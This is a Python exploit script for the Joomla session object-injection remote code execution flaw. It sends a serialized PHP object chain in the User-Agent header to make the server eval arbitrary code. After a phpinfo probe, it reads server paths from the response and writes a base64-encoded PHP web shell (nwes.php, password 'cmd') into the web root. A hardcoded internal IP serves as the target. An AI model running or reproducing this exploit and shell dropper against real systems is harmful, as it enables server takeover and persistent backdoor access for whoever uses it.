# -*- coding:utf-8 -*-

import urllib.request, urllib.parse, urllib.error
import re
import http.cookiejar, sys
import requests
import ssl

ssl._create_default_https_context = ssl._create_unverified_context


def get_url(url,user_agent):
    headers = {
    'User-Agent': user_agent
    }
    cookies = requests.get(url,headers=headers,verify=False).cookies
    for _ in range(2):
        response = requests.get(url, headers=headers, cookies=cookies,verify=False)
    return response.content

def php_str_noquotes(data):
    encoded = ""
    for char in data:
        encoded += "chr({0}).".format(ord(char))
    return encoded[:-1]

def generate_payload(php_payload):
    php_payload = "eval({0})".format(php_str_noquotes(php_payload))
    terminate = '\xf0\xfd\xfd\xfd';
    exploit_template = r'''}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";'''
    injected_payload = "{};JFactory::getConfig();exit".format(php_payload)
    exploit_template += r'''s:{0}:"{1}"'''.format(str(len(injected_payload)), injected_payload)
    exploit_template += r''';s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\0\0\0connection";b:1;}''' + terminate

    return exploit_template

def getInfoByJoomlaRCE(result, param):
    if "System" in param:
        reg = '.*<tr><td class="e">System </td><td class="v">([^<>]*?)</td></tr>.*'
    elif "DOCUMENT_ROOT" in param:
        reg = '.*<tr><td class="e">DOCUMENT_ROOT </td><td class="v">([^<>]*?)</td></tr>.*'
    elif "SCRIPT_FILENAME" in param:
        reg = '.*<tr><td class="e">SCRIPT_FILENAME </td><td class="v">([^<>]*?)</td></tr>.*'
    match_url = re.search(reg,result)
    if match_url:
        info = match_url.group(1)
    else:
        info = 'no info!'
    return info

def getShellByJoomlaRCE(url, system, script_filename):
    #shell的密码为cmd
    if 'no info' not in script_filename and 'no info' not in system:
        if 'Windows' in system:
            shell = script_filename.split('index.php')[0].replace('/','//').strip()+"nwes.php"
        else:
            shell = script_filename.split('index.php')[0]+"nwes.php"
        cmd ="file_put_contents('"+shell+"',base64_decode('PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7ID8+'));"
        pl = generate_payload(cmd)
        try:
            get_url(url, pl)
            return url+"nwes.php"
        except Exception as e:
            return "no info!"
    else:
        return "no info!"

def checkJoomlaRCE(url):
    poc = generate_payload("phpinfo();")
    try:
        result = get_url(url , poc)
        if 'phpinfo()' in result:
            system = getInfoByJoomlaRCE(result , 'System')
            document_root = getInfoByJoomlaRCE(result , 'DOCUMENT_ROOT')
            if document_root == 'no info!':
                msg = 'There is a joomla Object Injection , but get shell failed!'
                number = 'v8'
                return True,url,number,msg
            script_filename = getInfoByJoomlaRCE(result, 'SCRIPT_FILENAME')
            if script_filename == 'no info!':
                msg = 'There is a joomla Object Injection , but get shell failed!'
                number = 'v8'
                return True, url,number,msg
            shell_file = getShellByJoomlaRCE(url, system, script_filename)
            if shell_file == 'no info!':
                msg = 'There is a joomla Object Injection , but get shell failed!'
                number = 'v8'
                return True, url,number,msg
            msg = 'get shell succsss, shell:  %s' %shell_file
            number = 'v8'
            return True,url,number,msg
        else:
            msg = 'safe'
            number = 'v0'
            return False,url,number,msg

    except Exception as e:
        msg = str(e)
        number = 'v0'
        return False,url,number,msg

def exploit(protocol,ip,port):
    url=protocol+'://'+ip+':'+str(port)
    res = checkJoomlaRCE(url)
    return res

def verify(protocol,ip,port):
    url=protocol+'://'+ip+':'+str(port)
    cj = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
    urllib.request.install_opener(opener)
    #urllib2.socket.setdefaulttimeout(10)
    print('testing if joomla vul')

    ua = '}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\x5C0\x5C0\x5C0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";s:37:"phpinfo();JFactory::getConfig();exit;";s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\x5C0\x5C0\x5C0connection";b:1;}\xF0\x9D\x8C\x86'
    req = urllib.request.Request(url=url,headers={'User-Agent': ua})
    #opener.open(req)
    #req = urllib2.Request(url=url)
    try:
        opener.open(req, timeout=5)
        req = urllib.request.Request(url=url)
        res = opener.open(req, timeout=5).read()
        if '_SERVER["DOCUMENT_ROOT"]' in res:
            msg = 'There is a joomla Object Injection'
            number = 'v8'
            print(msg)
            return True,url,number,msg
        else:
            msg = 'safe'
            number = 'v0'
            return False,url,number,msg
    except Exception as e:
        #print(e)
        msg = 'not joomla'
        number = 'v0'
        return False,url,number,msg


if __name__ == '__main__':
    ip = '10.41.70.40'
    port = '443'
    res = verify('https',ip,port)
    print(res)








